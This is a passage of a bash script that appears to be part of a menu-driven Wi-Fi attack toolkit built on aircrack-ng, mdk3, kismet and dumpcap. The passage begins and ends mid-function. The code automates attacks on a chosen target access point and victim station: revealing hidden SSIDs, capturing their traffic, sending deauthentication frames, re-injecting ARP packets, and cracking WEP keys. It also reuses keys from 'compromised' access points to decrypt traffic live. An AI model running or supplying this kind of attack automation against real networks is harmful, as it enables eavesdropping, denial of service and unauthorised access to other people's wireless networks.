			echo "---> $INT Interface Selected!"
			sleep 1
			echo "---> Determining Interface Parent..."
			airmon-ng > ./tmp/airmonout
			PARENT=$(cat ./tmp/airmonout |grep $INT |cut -d":" -f2 |cut -d")" -f1 |cut -d" " -f2)
			CHILD=$INT
			if [ "$PARENT" = "wifi0" ]; then
				NAME=MAIN
			elif [ "$PARENT" = "wifi1" ]; then
				NAME=AUX
			else
				NAME=UNKNOWN
			fi
			echo "---> Found Interface Parent!"
			echo "---> Writing Kismet Configuration Line..."
			sleep 1
			echo "source=madwifi_g,$PARENT,$NAME" > ./tmp/kismetsourcelines
			echo "---> Source Line Written!"
			echo "---> Moving On!"
				kismetgps

		else
			echo
			export INT=$(cat ./tmp/monitoringinterfaces)
			export DESTROYALL=FALSE
			echo
			echo "---> $INT Interface Selected!"
			sleep 1
			echo "---> Determining Interface Parent..."
			airmon-ng > ./tmp/airmonout
			PARENT=$(cat ./tmp/airmonout |grep $INT |cut -d":" -f2 |cut -d")" -f1 |cut -d" " -f2)
			CHILD=$INT
			if [ "$PARENT" = "wifi0" ]; then
				NAME=MAIN
			elif [ "$PARENT" = "wifi1" ]; then
				NAME=AUX
			else
				NAME=UNKNOWN
			fi
			echo "---> Found Interface Parent!"
			echo "---> Writing Kismet Configuration Line..."
			sleep 1
			echo "source=madwifi_g,$PARENT,$NAME" > ./tmp/kismetsourcelines
			echo "---> Source Line Written!"
			echo "---> Moving On!"
				kismetgps
		fi
	elif [ "$INTS" = "2" ]; then
		echo
		echo "---> Would you like to use both interfaces to scan?"
		echo "---> [y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			echo
			export DESTROYALL=TRUE
			echo "---> Determining Interface Parents..."
			sleep 1
			airmon-ng > ./tmp/airmonout
			> ./tmp/kismetsourcelines
			for inters in $(cat ./tmp/monitoringinterfaces); do
				PARENT=$(cat ./tmp/airmonout |grep $inters |cut -d":" -f2 |cut -d")" -f1 |cut -d" " -f2)
				CHILD=$inters
				if [ "$PARENT" = "wifi0" ]; then
					NAME=MAIN
				elif [ "$PARENT" = "wifi1" ]; then
					NAME=AUX
				else
					NAME=UNKNOWN
				fi
				sleep 1
				echo "---> Parent of $inters Found!"
				echo "---> Writing Kismet Configuration Line..."
				sleep 1
				echo "source=madwifi_g,$PARENT,$NAME" >> ./tmp/kismetsourcelines
			done
			echo "---> Kismet Sources Written!"
			echo "---> Moving On!"
			sleep 1
			kismetgps
		elif [ "$Q" = "n" ]; then
			echo
			echo "---> Which Interface would you like to use?"
			 OPTIONS="$(cat ./tmp/monitoringinterfaces) WIFI-Scans Main-Menu"
				select opt in $OPTIONS; do
					if [ "$opt" = "WIFI-Scans" ]; then
						echo
						echo "---> Returning to Wifi Scans Menu..."
						sleep 1
							WIFI-Scans
					elif [ "$opt" = "Main-Menu" ]; then
						echo
						echo "---> Returning to Main Menu..."
						sleep 1
							Main-Menu
					elif [ "$opt" = "$opt" ]; then
						INT=$opt
						echo
						echo "---> $INT Interface Selected!"
						sleep 1
						echo "---> Determining Interface Parent..."
						airmon-ng > ./tmp/airmonout
						PARENT=$(cat ./tmp/airmonout |grep $INT |cut -d":" -f2 |cut -d")" -f1 |cut -d" " -f2)
						CHILD=$INT
						if [ "$PARENT" = "wifi0" ]; then
							NAME=MAIN
						elif [ "$PARENT" = "wifi1" ]; then
							NAME=AUX
						else
							NAME=UNKNOWN
						fi
						echo "---> Found Interface Parent!"
						echo "---> Writing Kismet Configuration Line..."
						sleep 1
						echo "source=madwifi_g,$PARENT,$NAME" > ./tmp/kismetsourcelines
						echo "---> Source Line Written!"
						echo "---> Moving On!"
							kismetgps
					else
						echo
						echo "---> Invalid Selection!"
					fi
				done
		else
			echo "---> Invalid Selection!"
		fi
	else
		echo "---> Invalid Amount of VAPs in Monitor Mode!"
	fi
}

					# End Kismet Scan Preparation Function--->

					# <---Start Kismet GPS Detection & WEP Key Preparation Function

function kismetgps {
	echo
	echo "---> Detecting GPS..."
	sleep 1
	if [ $(cat ./config/GPS.dev) != $(cat /dev/null) ]; then
		echo "---> GPS Possibly Detected!"
		echo
		echo "---> Would you like to try and use it?"
		echo "---> [y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			export GPSSTATE=TRUE
			echo
			echo "---> Writing Kismet Configuration Line..."
			sleep 1
			echo "gps=true" > ./tmp/kismetgps
			echo "---> Done!"
			echo "---> Moving On!"
		elif [ "$Q" = "n" ]; then
			export GPSSTATE=FALSE
			echo
			echo "---> Writing Kismet Configuration Line..."
			sleep 1
			echo "gps=false" > ./tmp/kismetgps
			echo "---> Done!"
			echo "---> Moving On!"
		else
			echo
			echo "---> Invalid Selection!"
		fi
	else
		echo "Please specify the /dev/(USBDevice) in file $pwd/config/GPS.dev"
		echo
		export GPSSTATE=FALSE
		echo "---> GPS Not Found!"
		echo "---> Writing Kismet Configuration Line..."
		sleep 1
		echo "gps=false" > ./tmp/kismetgps
		echo "---> Done!"
		echo "---> Moving On!"
	fi
	echo
	echo "---> Would you like to Live Decrypt known Access Points?"
	echo "---> [y/n]"
	read Q
	if [ "$Q" = "y" ]; then
		collectwepkeys
	elif [ "$Q" = "n" ]; then
		export GPS=no
		initalizekismet
	else
		echo "---> Invalid Selection!"
	fi
}

					# End Kismet GPS Detection & WEP Key Preparation Function--->

					# <---Start WEP Key Database Extraction Function

function collectwepkeys {
	echo
	echo "---> Accessing Database..."
	sleep 1
	echo "---> Searching for Compromised Access Points..."
	sleep 2
	cat ./logs/WEPc.log |grep '~~~' -A1 |grep -v PDT |grep -v PST |grep -v GMT |grep -v ~~~ |grep ':' > ./tmp/collectwep
	NUMBER=$(cat ./tmp/collectwep |wc -l)
	echo "---> Found $NUMBER Compromised Access Points!"
	sleep 1
	echo "---> Initializing Access Code Extraction..."
	sleep 1
	echo
	> ./tmp/kismettmpkeys
	for APS in $(cat ./tmp/collectwep); do
		NAME=$APS
		cat ./logs/WEPc.log |grep $APS -A7 > ./tmp/databasetmp
		echo "---> Found $NAME... Writing Configuration..."
		sleep 1
		echo "wepkey=$(cat ./tmp/databasetmp |grep BSSID |cut -d" " -f2),$(cat ./tmp/databasetmp |grep Key |cut -d" " -f2)" >> ./tmp/kismettmpkeys
	done
	echo
	echo "---> Encryption Code Configuration Complete!"
		initalizekismet
}

					# End WEP Key Database Extraction Function --->

					# <---Start Kismet Initalization Function

function initalizekismet {
	echo
	echo "---> Writing Final Configuration..."
	sleep 1
	cat ./config/kismetconf/kismettop.conf > ./config/kismetconf/kismet.conf
	cat ./tmp/kismetsourcelines >> ./config/kismetconf/kismet.conf
	cat ./config/kismetconf/kismetmiddle.conf >> ./config/kismetconf/kismet.conf
	cat ./tmp/kismetgps >> ./config/kismetconf/kismet.conf
	cat ./config/kismetconf/kismetmiddlekeys.conf >> ./config/kismetconf/kismet.conf
	if [ "$GPS" = "no" ]; then
		echo "NULL" > /dev/null
	else
		cat ./tmp/kismettmpkeys >> ./config/kismetconf/kismet.conf
	fi
	cat ./config/kismetconf/kismetbottom.conf >> ./config/kismetconf/kismet.conf
	echo "---> Configuring Interfaces..."
	sleep 1
	if [ "$DESTROYALL" = "TRUE" ]; then
		> ./tmp/attackinterface.cfg
		for ints in $(cat ./tmp/monitoringinterfaces); do
			wlanconfig $ints destroy 2> /dev/null
		done
	elif [ "$DESTROYALL" = "FALSE" ]; then
		wlanconfig $CHILD destroy
		> ./tmp/attackinterface.cfg
	else
		echo "---> Error! Kismet Interface Destruction Function!"
		echo "---> Possibly an error with the CHILD Variable."
		echo "---> CHILD Variable is $CHILD"
	fi
	if [ "$GPSSTATE" = "TRUE" ]; then
		gpsd -n /dev/ttyUSB0
	else
		echo "NULL" > /dev/null
	fi
	echo "---> Initalizing Kismet Server..."
	cd ./output/kismet
	kismet_server -f /root/attackvector/config/kismetconf/kismet.conf --daemonize &> /dev/null
	cd ../../
	sleep 1
	echo "---> Initalizing GUI..."
	sleep 1
	kismet_client -u /root/attackvector/config/kismetconf/kismet_ui.conf.other
	echo "---> Would you like to terminate Scanning Server?"
	read Q
	if [ "$Q" = "y" ]; then
		echo
		echo "---> Killing Server..."
		killall kismet_server &> /dev/null
		killall gpsd &> /dev/null
		echo "---> Server Dead!"
		export INT=""
	elif [ "$Q" = "n" ]; then
		echo "---> Kismet Finished!"
	else
		echo "---> Invalid Selection!"
	fi
	echo "---> Returning to Main Menu..."
	sleep 1
	Main-Menu
}

					# End Kismet Initalization Function--->

					# <---Start Reveal Hidden SSID's Function

function REVEALHIDDEN {
clear
cat ./headers/revealhiddenheader
cat ./headers/line1
	echo
	echo "---> Would you like to try revealing all hidden APs in Range"
	echo "---> Or would you like to specify the AP?"
	echo "---> [(A)ll/(S)pecify]"
	read Q
	if [ "$Q" = "a" ]; then
		echo
		echo "---> Initalizing Access Point Scan..."
		sleep 1
		konsole --noclose -e airodump-ng $INT &
		echo
		echo "---> Initalizing Hidden SSID Detection..."
		konsole --noclose -e ./apps/mdk3 $INT p -f ./databases/MasterSSID.lst &
		echo
		echo "---> Moving to Target Options Menu..."
		sleep 1
			Target-Options
	elif [ "$Q" = "s" ]; then
		echo
		echo "---> Determining Current Target..."
		sleep 1
		if [ "$TBSSID" = "$(cat /dev/null)" ]; then
			echo "---> No Target Set!"
			echo "---> Please Set a Target!"
			sleep 1
			echo "---> Returning to WIFI Scans..."
			sleep 2
				WIFI-Scans
		else
			echo "---> Target Found: $TBSSID"
			sleep 1
			echo "---> Setting Target..."
			sleep 1
			TARGET=$TBSSID
			echo "---> Target Set!"
			echo "---> Initalizing Access Point Scan..."
			sleep 1
			$(cat ./config/scan.cfg) airodump-ng --band g --channel $TCH --showack --berlin 1 --bssid $TARGET $INT &
			echo "---> Initalizing Hidden SSID Detection..."
			konsole --noclose -e ./apps/mdk3 $INT p -f ./databases/MasterSSID.lst -t $TBSSID &
			echo "---> Moving to Target Options..."
			sleep 1
				Target-Options
		fi
	else
		echo "---> Invalid Selection!"
	fi
}

					# End Reveal Hidden SSID's Function--->

					# <---Start Local Area Network Scans Menu Function

function LAN-Scans {
clear
cat ./headers/lanscanheader
cat ./headers/line1
	echo
	echo "---> Select Scan to Initalize!"
 OPTIONS="Nmap SNMP Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo
			echo "Invalid Selection!"
			sleep 1
				LAN-Scans
		fi
	done
}

					# End LAN Scans Menu Function--->

					# <---Start Nmap Scan Function

function Nmap {
clear
cat ./headers/nmapscanheader
cat ./headers/line1
	echo
	echo "---> Loading..."
	sleep 1
	echo "---> Network Mapper Ready! <---"
	read SCAN
	if [ "$SCAN" = "quit" ]; then
		echo
		echo "---> Returning to LAN Attacks Menu..."
		sleep 2
			LAN-Scans
	else
		echo
		echo "---> Scan options:"
		echo "---> $SCAN"
		echo
		echo "---> Are these scanning options correct?"
		read Q
		if [ "$Q" = "n" ]; then
			echo
			echo "Please Re-Enter!"
			sleep 2
				Nmap
		elif [ "$Q" = "y" ]; then
			echo
			echo "---> Initalizing Nmap Scan..."
			cd ./output/nmap
			nmap $SCAN
			cd /root/attackvector/
			echo
			echo "---> Press Enter to Return to LAN Scans Menu!"
			read ENTER
				LAN-Scans
		else
			echo
			echo "Invalid Selection!"
			sleep 2
				Nmap
		fi
	fi
}

					# End Nmap Scan Function --->

					# <---Start SNMP Enumeration Scan Function

function SNMP {
clear
cat ./headers/snmpscanheader
cat ./headers/line1
	echo
	echo "---> Operating System Type? <---"
 OPTIONS="windows linux cisco LAN-Scans Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "LAN-Scans" ]; then
			echo
			echo "---> Returning to LAN Scans Menu..."
			sleep 2
				LAN-Scans
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			echo
			echo "---> Target System Type: $opt!"
			echo
			echo "---> Target IP Address? <---"
			read IP
			echo
			echo "---> Target IP Address: $IP!"
			echo
			echo "---> Comunity String? <---"
			read COMSTRING
			echo
			echo "---> Comunity String: $COMSTRING!"
			echo
			echo "OPTIONS: $IP $COMSTRING $opt"
			echo "---> READY!"
			echo "---> Press Enter to Start SNMP Scan!"
			read ENTER
			if [ "$ENTER" = "return" ]; then
				echo "Debug Command Received!"
				echo "Returning to Main Menu..."
				sleep 2
					Main-Menu
			else
				echo
				echo "---> Initalizing SNMP Scan..."
				cd /pentest/enumeration/snmpenum/
				/pentest/enumeration/snmpenum/snmpenum.pl $IP $COMSTRING ./$opt.txt
				cd ~/attackvector/
				echo "---> SNMP Scan Complete!"
				echo "---> Press Enter to Return to Main Menu."
				read ENTER
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			fi
		else
			echo "Invalid Selection!"
			sleep 2
				SNMP
		fi
	done
}

					# End SNMP Scanner Function--->

					# <---Start Wlan Monitoring Menu Function

function WIFI-Monitoring {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "What would you like to Listen for?"
 OPTIONS="Beacons Data Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 1
					Main-Menu
		elif [ "$opt" = "$opt" ]; then
					$opt
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Wlan Monitoring Menu Function --->

					# <---Start Beacon Collection Menu Function

function Beacons {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "How would you like the Beacons to be Collected?"
 OPTIONS="All-Beacons AP-Specific CH-Specific Previous-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "Returning to Previous Menu..."
			sleep 1
					WIFI-Monitoring
		elif [ "$opt" = "AP-Specific" ]; then
					AP-SpecificB
		elif [ "$opt" = "$opt" ]; then
					$opt
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Beacon Collection Menu Function --->

					# <---Start All Access Points Beacon Collection Function

function All-Beacons {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "---> Please Enter Output Filename."
	echo "[ Do NOT include a file extention! e.g: .cap, .pcap ]"
	read OUTPUT
	if [ "$OUTPUT" = "return" ]; then
		echo
		echo "---> Returning to Main Menu..."
		sleep 1
			Main-Menu
	else
		echo "NULL" > /dev/null
	fi
	echo
	echo "Initalizing Open Beacon Collection..."
	sleep 2
	$(cat ./config/scan.cfg) airodump-ng -w /tmp/$OUTPUT-ABC --band g -s 0 --beacons $INT &
	echo "Initalization Complete!"
	echo
	echo "Returning to Main Menu..."
	sleep 3
			Main-Menu
}

					# End All Access Points Beacon Collection Function --->

					# <---Start Access Point Specific Beacon Collection Function

function AP-SpecificB {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "---> Please Enter Output Filename."
	echo "[ Do NOT include a file extention! e.g: .cap, .pcap ]"
	read OUTPUT
	echo
	echo "Would you like to Specify the Access Points' BSSID"
	echo "or use the Target Already set?"
	echo
	echo "Current Target: $TESSID"
	echo "[(d)efine/(t)arget]"
	read Q
	if [ "$Q" = "t" ]; then
		ifconfig $INT down
		iwconfig $INT channel $TCH
		ifconfig $INT up
		echo
		echo "Target BSSID Selected for Collection: $TBSSID on Channel: $TCH"
		echo
		echo "Initalizing Access Point Specific Beacon Collection..."
		sleep 2
		$(cat ./config/dump.cfg) dumpcap -i $INT -f "(ether host $TBSSID) && (broadcast)" -w /tmp/$OUTPUT-APSBC.cap &
		echo
		echo "Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
					Main-Menu
	elif [ "$Q" = "d" ]; then
		echo
		echo "Please Enter Target BSSID to Listen for."
		read BSSID
		echo
		echo "Please Enter Channel to Listen on."
		read CH
		ifconfig $INT down
		iwconfig $INT channel $CH
		ifconfig $INT up
		echo
		echo "Target BSSID Selected for Collection: $BSSID on Channel: $CH"
		echo
		echo "Initalizing Access Point Specific Beacon Collection..."
		sleep 2
		$(cat ./config/dump.cfg) dumpcap -i $INT -f "(ether host $BSSID) && (broadcast)" -w /tmp/$OUTPUT-APSBC.cap &
		echo
		echo "Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
					Main-Menu
	else
		echo
		echo "Invalid Selection!"
		echo "Try Again."
	fi
}

					# End Access Point Specific Beacon Collection Function --->

					# <---Start Channel Specific Beacon Collection Function

function CH-Specific {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "---> Please enter Output Filename."
	echo "[ Please do NOT include a file extention! e.g: .cap, .pcap ]" 
	read OUTPUT
	echo
	echo "Would you like Define you channel"
	echo "or use the Target Channel?"
	echo
	echo "Current Target Channel: $TCH"
	echo "[(d)efine/(t)arget]"
	read Q
	if [ "$Q" = "d" ]; then
		echo
		echo "Please Enter Channel to Listen on."
		read CH
		echo
		echo "Listen Channel Set to: $CH"
		ifconfig $INT down
		iwconfig $INT channel $CH
		ifconfig $INT up
		echo
		echo "Initalizing Channel Specific Beacon Collection..."
		$(cat ./config/dump.cfg) dumpcap -i $INT -f broadcast -w /tmp/$OUTPUT-CSBC.cap &
		echo
		echo "Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
					Main-Menu
	elif [ "$Q" = "t" ]; then
		echo
		echo "Target Channel Set to: $TCH"
		ifconfig $INT down
		iwconfig $INT channel $TCH
		ifconfig $INT up
		echo
		echo "Initalizing Channel Specific Beacon Collection..."
		$(cat ./config/dump.cfg) dumpcap -i $INT -f broadcast -w /tmp/$OUTPUT-CSBC.cap &
		echo
		echo " Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
					Main-Menu
	else
		echo "Invalid Selection!"
		echo "Try Again"
	fi
}

					# End Channel Specific Beacon Collection Function --->

					# <---Start Wifi Monitoring Data Sub-Menu Function

function Data {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "How would you like to Listen for Data?"
	echo
 OPTIONS="All-Data AP-Specific Channel-Specific Previous-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "Returning to Previous Menu..."
			sleep 1
					WIFI-Monitoring
		elif [ "$opt" = "AP-Specific" ]; then
					AP-SpecificD
		elif [ "$opt" = "$opt" ]; then
					$opt
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Wifi Monitoring Data Sub-Menu Function --->

					# <---Start Open Air Un-Encrypted Data Collection Function

function All-Data {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "Please Enter Output Filename"
	echo "[ Do NOT include a file extention! (e.g: .cap, .pcap) ]"
	read OUTPUT
	echo
	echo "Initalizing Data Collection..."
	echo
	$(cat ./config/scan.cfg) airodump-ng -w ./output/data/$OUTPUT.cap --band g -s 1 $INT &
	echo
	echo "Initalization Complete!"
	echo
	echo "Returning to Main Menu..."
	sleep 2
			Main-Menu
}

					# End Open Air Un-Encrypted Data Collection Function --->

					# <---Start AP-Specific Data Collection Function

function AP-SpecificD {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "Please enter Output Filename"
	echo "[ Do NOT include a file extention! e.g: .cap, .pcap ]"
	read OUTPUT
	echo
	echo "Would you like to define the AP and Channel"
	echo "or use the Target already set?"
	echo
	echo "Current Target:"
	echo
	echo "BSSID:----$TBSSID"
	export BSSID=$TBSSID
	echo "ESSID:----$TESSID"
	export ESSID=$TESSID
	echo "Channel:--$TCH"
	echo
	echo "[(d)efine/(t)arget]"
	read Q
	if [ "$Q" = "d" ]; then
		echo
		echo "Please enter APs BSSID"
		read BSSID
		echo
		echo "Please enter Channel to Listen On"
		read CH
		echo
		echo "Please enter Cipher Suite"
		echo "[WEP/WPA]"
		read ENC
		if [ "$ENC" = "WEP" ]; then
			echo "---------------------------" >> ./output/data/WEPcap.log
			echo "$BSSID" >> ./output/data/WEPcap.log
			echo "$OUTPUT" >> ./output/data/WEPcap.log
		elif [ "$ENC" = "WPA" ]; then
			echo "---------------------------" >> ./output/data/WPAcap.log
			echo "$BSSID" >> ./output/data/WPAcap.log
			echo "$OUTPUT" >> ./output/data/WPAcap.log
			echo "ESSID: $ESSID" >> ./output/data/WPAcap.log
		else
			echo
			echo "Error!"
			echo
			echo "Unable to Determine Encryption Type!"
			echo "This is needed for later use when decrypting the Capture Offline."
			echo
			echo "TraceBack:"
			echo
			echo "Variable Name: ENC"
			echo "Variable Value: $ENC"
			echo
			echo "Must be Either WEP or WPA"
			echo
			echo "Press Enter to Return to Main Menu!"
			read ENTER
				Main-Menu
		fi
		echo "Target BSSID Selected for Collection: $BSSID on Channel: $CH"
		sleep 1
		ifconfig $INT down
		iwconfig $INT channel $CH
		ifconfig $INT up
		echo
		echo "Initalizing Access Point Specific Data Collection..."
		sleep 1
		$(cat ./config/dump.cfg) dumpcap -i $INT -f "(ether host $BSSID) && (not broadcast and not multicast)" -w /tmp/$OUTPUT-APSDC.cap &
		echo
		echo "Initalization Complete!"
		echo 
		echo "Returning to Main Menu..."
		sleep 3
				Main-Menu
	elif [ "$Q" = "t" ]; then
		echo
		if [ "$TENC" = "WEP" ]; then
			echo "---------------------------" >> ./output/data/WEPcap.log
			echo "$BSSID" >> ./output/data/WEPcap.log
			echo "$OUTPUT" >> ./output/data/WEPcap.log
		elif [ "$TENC" = "WPA" ]; then
			echo "---------------------------" >> ./output/data/WPAcap.log
			echo "$BSSID" >> ./output/data/WPAcap.log
			echo "$OUTPUT" >> ./output/data/WPAcap.log
		else
			echo
			echo "Error!"
			echo
			echo "Unable to Determine Encryption Type!"
			echo "This is needed for later use when decrypting the Capture Offline."
			echo
			echo "TraceBack:"
			echo
			echo "Variable Source: Value Pulled fromm variable TENC"
			echo "Variable Value: $TENC"
			echo
			echo "Must be Either WEP or WPA"
			echo
			echo "Press Enter to Return to Main Menu!"
			read ENTER
				Main-Menu
		fi
		echo "Target BSSID Selected for Collection: $TBSSID on Channel: $TCH"
		sleep 1
                ifconfig $INT down
                iwconfig $INT channel $TCH
                ifconfig $INT up
		echo
		echo "Initalizing Access Point Specific Data Collection..."
		sleep 1
		$(cat ./config/dump.cfg) dumpcap -i $INT -f "(ether host $TBSSID) && (not broadcast and not multicast)" -w /tmp/$OUTPUT-APSDC.cap &
		echo
		echo "Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
				Main-Menu
	else
		echo "Invalid Selection!"
	fi
}

					# End Access Point Specific Data Collection Function --->

					# <---Start Channel Specific Data Collection Function

function Channel-Specific {
clear
cat ./headers/wifimonitoringheader
cat ./headers/line1
	echo "Please Enter Output Filename"
	read OUTPUT
	echo
	echo "Would you like Define the channel"
	echo "or use the Target Channel?"
	echo
	echo "Current Target Channel: $TCH"
	echo "[(d)efine/(t)arget]"
	read Q
	if [ "$Q" = "t" ]; then
		echo "Target Channel Selected for Collection: $TCH"
		echo
		echo "Initalizing Channel Specific Data Collection..."
		ifconfig $INT down
		iwconfig $INT channel $TCH
		ifconfig $INT up
		sleep 1
		$(cat ./config/dump.cfg) dumpcap -i $INT -f "not broadcast and not multicast" -w /tmp/$OUTPUT-CSDC.cap &
		echo
		echo "Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
				Main-Menu
	elif [ "$Q" = "y" ]; then
		FREQ=$(($(iwlist $INT freq | wc -l) - 3))
		echo
		echo "Available Channels for Interface $INT: 1 - $FREQ"
		echo
		echo "Please Specify Channel to Listen on"
		read CH
		echo
		echo "Target Channel Selected for Data Collection: $CH"
		echo
		echo "Initalizing Channel Specific Data Collection..."
		$(cat ./config/dump.cfg) dumpcap -i $INT -f "not broadcast and not multicast" -w /tmp/$OUTPUT-CSDC.cap &
		echo
		echo "Initalization Complete!"
		echo
		echo "Returning to Main Menu..."
		sleep 3
				Main-Menu
	else
		echo "Invalid Selection!"
	fi
}

					# End Channel Specific Data Collection Function --->

					# <---Start WEP/WPA Packet File Decoder Function

function Decode {
clear
cat ./headers/decodeheader
cat ./headers/line1
	echo
	echo "---> Calling Decoders Usage..."
	sleep 1
	echo
	cat ./config/decoder.usage
	echo
	echo "---> Please Enter Options."
	read OPTIONS
	if [ "$OPTIONS" = "quit" ]; then
		echo
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		echo
		echo "---> Initalizing Decode..."
		sleep 1
		cd ./output/data/decoded/
		airdecap-ng $OPTIONS
		cd ~/attackvector/
		echo
		echo "---> Decode Complete!"
		echo "---> Press Enter to Return to Main Menu..."
		read ENTER
		sleep 2
			Main-Menu
	fi
}

					# End WEP/WPA Decoder Function --->

					# <---Start Attacks Main Menu Function

function Attacks {
clear
cat ./headers/attacksmenuheader
cat ./headers/line1
 OPTIONS="WEP WPA LAN DoS Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 1
					Main-Menu
		elif [ "$opt" = "$opt" ]; then
				$opt
		else
			echo
			echo "Invalid Selection!"
					Attacks
		fi
	done
}

					# End Attacks Main Menu Function --->

					# <---Start Attacks Sub-Menu Function, WEP Attacks Menu

function WEP {
clear
cat ./headers/wepattacksmenuheader
cat ./headers/line1
	echo "How would you like to Attack?"
 OPTIONS="DeAuth FakeAuth Fragmentation Previous-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "Returning to Previous Menu..."
			sleep 1
					Attacks
		elif [ "$opt" = "$opt" ]; then
					$opt
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Attacks Sub-Menu Function, WEP Attacks Menu --->

					# <---Start WEP DeAuth Initalizer Function

function DeAuth {
clear
cat ./headers/deauthattackheader
cat ./headers/line1
	if [ "$TBSSID" != "$(cat /dev/null)" ]; then
		echo
		echo "Current Target"
		echo
		echo "ESSID:----$TESSID"
		echo "BSSID:----$TBSSID"
		echo "Cipher:---$TCIPHER"
		echo "Channel:--$TCH"
		echo "Victim:---$VICBSSID"
		echo
		echo "Would you like to attack this target?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			if [ -e "./output/attackdata/wepdeauth/$TESSID" ]; then
				echo "NULL" > /dev/null
			else
				mkdir ./output/attackdata/wepdeauth/$TESSID
			fi
			echo
			echo "Initalizing IV Capture..."
			sleep 1
			$(cat ./config/scan.cfg) airodump-ng -w ./output/attackdata/wepdeauth/$TESSID/$TESSID --ivs --band g --channel $TCH --showack --berlin 2 --bssid $TBSSID --encrypt $TENC $INT &
			echo
			echo "Initalizing ARP Packet Capture and Re-Injection..."
			sleep 1
			$(cat ./config/arpinject.cfg) aireplay-ng -3 -e $TESSID -a $TBSSID -h $VICBSSID $INT &
			sleep 1
			echo
					deauth
		elif [ "$Q" = "n" ]; then
			echo
			echo "Please Set a new target!"
			echo
			echo "Returning to Main Menu..."
			sleep 2
					Main-Menu
		else
			echo "Invalid Selection!"
		fi
	else
		echo
		echo "No Target Set!"
		echo
		echo "Please Set a Target!"
		echo
		echo "Returning to Main Menu..."
		sleep 2
				Main-Menu
	fi
}

					# End WEP DeAuth Initalizer Function --->

					# <---Start DeAuth Frame Transmission and IV Cracking Function

function deauth {
	echo "Would you like to Send DeAuth Frames or Start Encryption Cracking?"
	echo "[(C)rack/(D)eAuth]"
	read Q
	if [ "$Q" = "d" ]; then
		echo
		echo "How many DeAuthentication Frames would you like to transmit?"
		echo "[Default: 5]"
		read FRAMES
		echo
		if [ "$FRAMES" = "$(cat /dev/null)" ]; then
			export FRAMES=5
		else
			echo "NULL" > /dev/null
		fi
		echo "DeAuthenticating Station: $VICBSSID with $FRAMES Frames!"
		$(cat ./config/deauthwep.cfg) aireplay-ng -0 $FRAMES -a $TBSSID -c $VICBSSID $INT &
		echo
		echo "Would you like to Re-Send DeAuthentication Frames?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "y" ]; then
				echo
				deauth
		elif [ "$Q" = "n" ]; then
			echo
			echo "Would you like to Start Encryption Cracking?"
			echo "[y/n]"
			read Q
			if [ "$Q" = "n" ]; then
				echo
				echo "Returning to Main Menu..."
				sleep 2
						Main-Menu
			elif [ "$Q" = "y" ]; then
				$(cat ./config/wepcrack.cfg) aircrack-ng -f 2 -a 1 -b $TBSSID ./output/attackdata/wepdeauth/$TESSID/$TESSID*.ivs &
				echo 
				echo "Crack Attempt Running..."
				sleep 2
					entercode
			else
				echo "Invalid Selection!"
			fi
		else
			echo "Invalid Selection!"
		fi
	elif [ "$Q" = "c" ]; then
		echo
		echo "Initalizing Encryption Cracking..."
		$(cat ./config/wepcrack.cfg) aircrack-ng -f 2 -a 1 -b $TBSSID ./output/attackdata/wepdeauth/$TESSID/$TESSID*.ivs &
		sleep 1
		echo
		echo "Crack Attempt Running..."
		sleep 2
			entercode
	else
		echo
		echo "Invalid Selection!"
	fi
}

					# End DeAuth Frame Trasmission and IV Cracking Function --->

					# <---Start Fake Auth Initalizer Function

function FakeAuth {
clear
cat ./headers/fakeauthheader
cat ./headers/line1
	if [ "$TBSSID" != "$(cat /dev/null)"  ]; then
		echo
		echo "Current Target"
		echo
		echo "ESSID: $TESSID"
		echo "BSSID: $TBSSID"
		echo "Cipher: $TENC"
		echo "Channel: $TCH"
		echo
		echo "Would you like to attack this target?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "y" ]; then
			if [ -e "./output/attackdata/wepfakeauth/$TESSID" ]; then
				echo "NULL" > /dev/null
			else
				mkdir ./output/attackdata/wepfakeauth/$TESSID
			fi
			echo
			echo "Attacking Target $TESSID..."
			sleep 1
			echo
			echo "Initalizing IV Collection..."
			sleep 1
